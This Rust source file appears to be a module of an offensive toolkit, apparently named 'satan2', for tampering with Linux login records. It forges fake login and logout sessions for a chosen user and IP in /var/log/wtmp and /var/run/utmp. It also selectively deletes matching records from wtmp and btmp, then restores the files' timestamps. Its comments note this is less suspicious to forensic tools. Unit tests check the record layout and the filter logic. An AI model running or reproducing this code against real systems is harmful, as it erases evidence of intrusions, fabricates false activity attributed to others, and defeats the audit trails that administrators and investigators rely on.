// Binary injection into /var/log/wtmp and /var/run/utmp (struct utmp, 384 bytes each record).

use std::fs::{self, OpenOptions};
use std::io::{Read, Write};
use std::path::Path;

// struct utmp layout (x86-64 Linux / glibc) — verified 384 bytes
const UTMP_SIZE: usize = 384;
const UT_LINESIZE: usize = 32;
const UT_NAMESIZE: usize = 32;
const UT_HOSTSIZE: usize = 256;

const USER_PROCESS: i16 = 7;
const DEAD_PROCESS: i16 = 8;

// Field offsets derived from glibc bits/utmp.h layout on x86-64
const OFF_TYPE: usize = 0; // short (2) + 2-byte pad
const OFF_PID: usize = 4; // int32
const OFF_LINE: usize = 8; // char[32]
const OFF_ID: usize = 40; // char[4]
const OFF_USER: usize = 44; // char[32]
const OFF_HOST: usize = 76; // char[256]
                            // 332: exit_status (4), 336: session (4)
const OFF_TV_SEC: usize = 340; // int32
const OFF_TV_USEC: usize = 344; // int32
const OFF_ADDR: usize = 348; // int32[4]  (ut_addr_v6, IPv4 in [0])

// ── LCG ──────────────────────────────────────────────────────────────────────

struct Lcg(u64);
impl Lcg {
    fn new(seed: i64) -> Self {
        Lcg(seed as u64 ^ 0xc0ca_c01a_f00d_ba11)
    }
    fn next(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1_442_695_040_888_963_407);
        self.0
    }
    fn range(&mut self, lo: u64, hi: u64) -> u64 {
        lo + (self.next() % (hi - lo))
    }
    fn pick<'a, T>(&mut self, s: &'a [T]) -> &'a T {
        &s[(self.next() as usize) % s.len()]
    }
}

// ── Record builder ────────────────────────────────────────────────────────────

fn set_str(buf: &mut [u8], off: usize, max: usize, s: &str) {
    let b = s.as_bytes();
    let n = b.len().min(max);
    buf[off..off + n].copy_from_slice(&b[..n]);
}

fn ip_to_bytes(ip: &str) -> [u8; 4] {
    let parts: Vec<u8> = ip.split('.').filter_map(|p| p.parse().ok()).collect();
    if parts.len() == 4 {
        [parts[0], parts[1], parts[2], parts[3]]
    } else {
        [0; 4]
    }
}

#[allow(clippy::too_many_arguments)] // mirrors the positional fields of struct utmp
fn build_record(
    ut_type: i16,
    pid: i32,
    line: &str,
    id: &str,
    user: &str,
    host: &str,
    ts_sec: i32,
    ts_usec: i32,
) -> [u8; UTMP_SIZE] {
    let mut b = [0u8; UTMP_SIZE];
    b[OFF_TYPE..OFF_TYPE + 2].copy_from_slice(&ut_type.to_le_bytes());
    b[OFF_PID..OFF_PID + 4].copy_from_slice(&pid.to_le_bytes());
    set_str(&mut b, OFF_LINE, UT_LINESIZE, line);
    set_str(&mut b, OFF_ID, 4, id);
    set_str(&mut b, OFF_USER, UT_NAMESIZE, user);
    set_str(&mut b, OFF_HOST, UT_HOSTSIZE, host);
    b[OFF_TV_SEC..OFF_TV_SEC + 4].copy_from_slice(&ts_sec.to_le_bytes());
    b[OFF_TV_USEC..OFF_TV_USEC + 4].copy_from_slice(&ts_usec.to_le_bytes());
    // Store IPv4 in network byte order in ut_addr_v6[0]
    let addr_b = ip_to_bytes(host);
    b[OFF_ADDR..OFF_ADDR + 4].copy_from_slice(&addr_b);
    b
}

// ── Public API ────────────────────────────────────────────────────────────────

pub struct WtmpForgeOpts {
    pub fake_ip: String,
    pub fake_user: String,
    pub n_sessions: u32,
    pub ts_start: i64,
    pub ts_end: i64,
    pub verbose: bool,
}

#[derive(Default)]
pub struct WtmpForgeStats {
    pub records_written: u32,
    pub files_touched: u32,
    pub errors: u32,
}

pub fn forge_wtmp(opts: &WtmpForgeOpts) -> WtmpForgeStats {
    let mut s = WtmpForgeStats::default();
    let mut lcg = Lcg::new(opts.ts_start ^ opts.n_sessions as i64);
    let window = (opts.ts_end - opts.ts_start).max(1);
    let step = window / opts.n_sessions.max(1) as i64;

    const TERMINALS: &[&str] = &["pts/0", "pts/1", "pts/2", "pts/3", "pts/4"];
    const IDS: &[&str] = &["0", "1", "2", "3", "s/0"];

    let mut records: Vec<[u8; UTMP_SIZE]> = Vec::new();

    for i in 0..opts.n_sessions {
        let ts_login = opts.ts_start + i as i64 * step + lcg.range(0, step.min(120) as u64) as i64;
        let dur = lcg.range(120, 7_200) as i64;
        let ts_logout = (ts_login + dur).min(opts.ts_end);
        let pid = lcg.range(1_000, 65_000) as i32;
        let tty = lcg.pick(TERMINALS);
        let id = lcg.pick(IDS);
        let usec = lcg.range(0, 999_999) as i32;

        // Login record (USER_PROCESS)
        records.push(build_record(
            USER_PROCESS,
            pid,
            tty,
            id,
            &opts.fake_user,
            &opts.fake_ip,
            ts_login as i32,
            usec,
        ));

        // Logout record (DEAD_PROCESS)
        records.push(build_record(
            DEAD_PROCESS,
            pid,
            tty,
            id,
            "", // user cleared on logout
            "", // host cleared
            ts_logout as i32,
            lcg.range(0, 999_999) as i32,
        ));
    }

    let targets = ["/var/log/wtmp", "/var/log/wtmp.1"];
    for &path in &targets {
        if !Path::new(path)
            .parent()
            .map(|d| d.exists())
            .unwrap_or(false)
        {
            continue;
        }
        match OpenOptions::new().append(true).create(true).open(path) {
            Ok(mut f) => {
                let mut ok = 0u32;
                for rec in &records {
                    if f.write_all(rec.as_ref()).is_ok() {
                        ok += 1;
                    }
                }
                s.records_written += ok;
                s.files_touched += 1;
                if opts.verbose {
                    eprintln!("[+] forge-wtmp: {} records → {}", ok, path);
                }
            }
            Err(e) => {
                s.errors += 1;
                if opts.verbose {
                    eprintln!("[!] forge-wtmp: {}: {}", path, e);
                }
            }
        }
        break; // write only to whichever exists first
    }

    // Also update /var/run/utmp with the most recent login (if still "active")
    if Path::new("/var/run/utmp").exists() {
        if let Some(last_login) = records.first() {
            match OpenOptions::new().write(true).open("/var/run/utmp") {
                Ok(mut f) => {
                    let _ = f.write_all(last_login.as_ref());
                    s.files_touched += 1;
                    if opts.verbose {
                        eprintln!("[+] forge-wtmp: utmp updated");
                    }
                }
                Err(e) => {
                    s.errors += 1;
                    if opts.verbose {
                        eprintln!("[!] forge-wtmp: utmp: {}", e);
                    }
                }
            }
        }
    }

    s
}

// ── Selective wipe ────────────────────────────────────────────────────────────
//
// Remove specific records from wtmp/btmp without touching others.
// Criteria (all optional, ANDed): exact username, exact IP/host, time range.
// Unlike truncate-all, this leaves legitimate sessions intact — far less
// suspicious to forensic tools that expect some history in these files.

pub struct WtmpWipeFilter {
    pub username: Option<String>, // match ut_user field exactly
    pub host_ip: Option<String>,  // match ut_host field exactly
    pub ts_from: Option<i64>,     // remove records with tv_sec >= ts_from
    pub ts_to: Option<i64>,       // remove records with tv_sec <= ts_to
    pub verbose: bool,
}

#[derive(Default)]
pub struct WtmpWipeStats {
    pub records_kept: u32,
    pub records_removed: u32,
    pub files_touched: u32,
    pub errors: u32,
}

fn record_matches(rec: &[u8; UTMP_SIZE], f: &WtmpWipeFilter) -> bool {
    if let Some(ref u) = f.username {
        let user_bytes = &rec[OFF_USER..OFF_USER + UT_NAMESIZE];
        let end = user_bytes
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(UT_NAMESIZE);
        if std::str::from_utf8(&user_bytes[..end]).unwrap_or("") != u.as_str() {
            return false;
        }
    }
    if let Some(ref h) = f.host_ip {
        let host_bytes = &rec[OFF_HOST..OFF_HOST + UT_HOSTSIZE];
        let end = host_bytes
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(UT_HOSTSIZE);
        if std::str::from_utf8(&host_bytes[..end]).unwrap_or("") != h.as_str() {
            return false;
        }
    }
    let ts = i32::from_le_bytes([
        rec[OFF_TV_SEC],
        rec[OFF_TV_SEC + 1],
        rec[OFF_TV_SEC + 2],
        rec[OFF_TV_SEC + 3],
    ]) as i64;
    if let Some(from) = f.ts_from {
        if ts < from {
            return false;
        }
    }
    if let Some(to) = f.ts_to {
        if ts > to {
            return false;
        }
    }
    true
}

fn wipe_wtmp_path(path: &str, filter: &WtmpWipeFilter, s: &mut WtmpWipeStats) {
    use std::ffi::CString;

    let p = Path::new(path);
    if !p.exists() {
        return;
    }

    // Save timestamps before any write
    let saved_ts: Option<(i64, i64)> = fs::metadata(p).ok().map(|m| {
        use std::os::unix::fs::MetadataExt;
        (m.atime(), m.mtime())
    });

    // Read entire file
    let mut raw = Vec::new();
    {
        let mut f = match OpenOptions::new().read(true).open(p) {
            Ok(f) => f,
            Err(e) => {
                s.errors += 1;
                if filter.verbose {
                    eprintln!("[!] wtmp-wipe: read {}: {}", path, e);
                }
                return;
            }
        };
        if f.read_to_end(&mut raw).is_err() {
            s.errors += 1;
            return;
        }
    }

    if raw.len() % UTMP_SIZE != 0 && filter.verbose {
        eprintln!(
            "[!] wtmp-wipe: {}: size {} not a multiple of {}",
            path,
            raw.len(),
            UTMP_SIZE
        );
    }

    let n_records = raw.len() / UTMP_SIZE;
    let mut kept: Vec<u8> = Vec::with_capacity(raw.len());

    for i in 0..n_records {
        let start = i * UTMP_SIZE;
        let end = start + UTMP_SIZE;
        if end > raw.len() {
            break;
        }
        let mut rec = [0u8; UTMP_SIZE];
        rec.copy_from_slice(&raw[start..end]);

        if record_matches(&rec, filter) {
            s.records_removed += 1;
            if filter.verbose {
                let user_bytes = &rec[OFF_USER..OFF_USER + UT_NAMESIZE];
                let uend = user_bytes
                    .iter()
                    .position(|&b| b == 0)
                    .unwrap_or(UT_NAMESIZE);
                eprintln!(
                    "[+] wtmp-wipe: removed record[{}] user={:?}",
                    i,
                    std::str::from_utf8(&user_bytes[..uend]).unwrap_or("?")
                );
            }
        } else {
            kept.extend_from_slice(&rec);
            s.records_kept += 1;
        }
    }

    // Rewrite file atomically via tmp → rename
    let tmp_path = format!("{}.s2tmp", path);
    match OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .open(&tmp_path)
    {
        Ok(mut f) => {
            if f.write_all(&kept).is_err() {
                s.errors += 1;
                let _ = fs::remove_file(&tmp_path);
                return;
            }
        }
        Err(e) => {
            s.errors += 1;
            if filter.verbose {
                eprintln!("[!] wtmp-wipe: write {}: {}", tmp_path, e);
            }
            return;
        }
    }

    if fs::rename(&tmp_path, path).is_err() {
        s.errors += 1;
        let _ = fs::remove_file(&tmp_path);
        return;
    }

    s.files_touched += 1;

    // Restore original timestamps
    if let Some((atime, mtime)) = saved_ts {
        let times = [
            libc::timespec {
                tv_sec: atime,
                tv_nsec: 0,
            },
            libc::timespec {
                tv_sec: mtime,
                tv_nsec: 0,
            },
        ];
        if let Ok(c) = CString::new(path.as_bytes()) {
            unsafe {
                libc::utimensat(libc::AT_FDCWD, c.as_ptr(), times.as_ptr(), 0);
            }
        }
    }

    if filter.verbose {
        eprintln!(
            "[+] wtmp-wipe: {} — kept {}, removed {}",
            path, s.records_kept, s.records_removed
        );
    }
}

pub fn wipe_wtmp_selective(filter: &WtmpWipeFilter) -> WtmpWipeStats {
    let mut s = WtmpWipeStats::default();
    for path in &["/var/log/wtmp", "/var/log/btmp"] {
        wipe_wtmp_path(path, filter, &mut s);
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmpdir(tag: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!(
            "satan2-test-{}-{}-{}",
            tag,
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    /// glibc x86-64 struct utmp must be exactly 384 bytes.
    #[test]
    fn record_size_is_384() {
        assert_eq!(UTMP_SIZE, 384);
        let rec = build_record(USER_PROCESS, 1, "pts/0", "0", "u", "h", 0, 0);
        assert_eq!(rec.len(), 384);
    }

    #[test]
    fn record_field_layout() {
        let rec = build_record(
            USER_PROCESS,
            1234,
            "pts/3",
            "s/0",
            "alice",
            "10.0.0.5",
            1_700_000_000,
            42,
        );
        assert_eq!(i16::from_le_bytes([rec[OFF_TYPE], rec[OFF_TYPE + 1]]), 7);
        assert_eq!(
            i32::from_le_bytes(rec[OFF_PID..OFF_PID + 4].try_into().unwrap()),
            1234
        );
        assert_eq!(&rec[OFF_LINE..OFF_LINE + 5], b"pts/3");
        assert_eq!(rec[OFF_LINE + 5], 0, "string fields must be NUL-padded");
        assert_eq!(&rec[OFF_ID..OFF_ID + 3], b"s/0");
        assert_eq!(&rec[OFF_USER..OFF_USER + 5], b"alice");
        assert_eq!(&rec[OFF_HOST..OFF_HOST + 8], b"10.0.0.5");
        assert_eq!(
            i32::from_le_bytes(rec[OFF_TV_SEC..OFF_TV_SEC + 4].try_into().unwrap()),
            1_700_000_000
        );
        assert_eq!(
            i32::from_le_bytes(rec[OFF_TV_USEC..OFF_TV_USEC + 4].try_into().unwrap()),
            42
        );
        // IPv4 stored in network byte order in ut_addr_v6[0]
        assert_eq!(&rec[OFF_ADDR..OFF_ADDR + 4], &[10, 0, 0, 5]);
    }

    #[test]
    fn record_strings_truncated_to_field_size() {
        let long_user = "x".repeat(64);
        let rec = build_record(USER_PROCESS, 1, "pts/0", "0", &long_user, "h", 0, 0);
        assert_eq!(&rec[OFF_USER..OFF_USER + UT_NAMESIZE], &[b'x'; UT_NAMESIZE]);
        // Host field right after user must be unaffected by the overflow-length user
        assert_eq!(rec[OFF_HOST], b'h');
    }

    #[test]
    fn ip_parsing() {
        assert_eq!(ip_to_bytes("192.168.1.1"), [192, 168, 1, 1]);
        assert_eq!(ip_to_bytes("not-an-ip"), [0, 0, 0, 0]);
        assert_eq!(ip_to_bytes("1.2.3"), [0, 0, 0, 0]);
        assert_eq!(ip_to_bytes("999.1.1.1"), [0, 0, 0, 0]);
    }

    #[test]
    fn lcg_deterministic_and_bounded() {
        let mut a = Lcg::new(42);
        let mut b = Lcg::new(42);
        for _ in 0..100 {
            assert_eq!(a.next(), b.next(), "same seed must produce same stream");
        }
        let mut c = Lcg::new(7);
        for _ in 0..1000 {
            let v = c.range(10, 20);
            assert!((10..20).contains(&v), "range() out of bounds: {}", v);
        }
    }

    /// Write forged records to a temp file and parse them back — the on-disk
    /// layout must round-trip through a byte-level reader.
    #[test]
    fn write_then_read_back() {
        let dir = tmpdir("wtmp");
        let path = dir.join("wtmp");
        let recs = [
            build_record(
                USER_PROCESS,
                4321,
                "pts/1",
                "1",
                "bob",
                "172.16.0.9",
                1_650_000_000,
                7,
            ),
            build_record(DEAD_PROCESS, 4321, "pts/1", "1", "", "", 1_650_003_600, 9),
        ];
        {
            let mut f = std::fs::File::create(&path).unwrap();
            for r in &recs {
                f.write_all(r.as_ref()).unwrap();
            }
        }

        let raw = std::fs::read(&path).unwrap();
        assert_eq!(raw.len(), 2 * UTMP_SIZE);
        for (i, orig) in recs.iter().enumerate() {
            let chunk = &raw[i * UTMP_SIZE..(i + 1) * UTMP_SIZE];
            assert_eq!(chunk, orig.as_ref(), "record {} corrupted on disk", i);
        }
        // And the filter logic must see the fields we wrote
        let mut rec0 = [0u8; UTMP_SIZE];
        rec0.copy_from_slice(&raw[..UTMP_SIZE]);
        let f_bob = WtmpWipeFilter {
            username: Some("bob".into()),
            host_ip: None,
            ts_from: None,
            ts_to: None,
            verbose: false,
        };
        assert!(record_matches(&rec0, &f_bob));
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn record_matches_filter_logic() {
        let rec = build_record(
            USER_PROCESS,
            1,
            "pts/0",
            "0",
            "alice",
            "10.0.0.5",
            1_000_000,
            0,
        );
        let base = WtmpWipeFilter {
            username: None,
            host_ip: None,
            ts_from: None,
            ts_to: None,
            verbose: false,
        };
        assert!(
            record_matches(&rec, &base),
            "empty filter must match everything"
        );

        let mk =
            |u: Option<&str>, h: Option<&str>, from: Option<i64>, to: Option<i64>| WtmpWipeFilter {
                username: u.map(String::from),
                host_ip: h.map(String::from),
                ts_from: from,
                ts_to: to,
                verbose: false,
            };
        assert!(record_matches(&rec, &mk(Some("alice"), None, None, None)));
        assert!(!record_matches(
            &rec,
            &mk(Some("mallory"), None, None, None)
        ));
        assert!(record_matches(
            &rec,
            &mk(None, Some("10.0.0.5"), None, None)
        ));
        assert!(!record_matches(
            &rec,
            &mk(None, Some("10.0.0.6"), None, None)
        ));
        assert!(record_matches(
            &rec,
            &mk(None, None, Some(999_999), Some(1_000_001))
        ));
        assert!(!record_matches(
            &rec,
            &mk(None, None, Some(1_000_001), None)
        ));
        assert!(!record_matches(&rec, &mk(None, None, None, Some(999_999))));
        // AND semantics: one mismatching criterion rejects
        assert!(!record_matches(
            &rec,
            &mk(Some("alice"), Some("10.0.0.6"), None, None)
        ));
    }
}
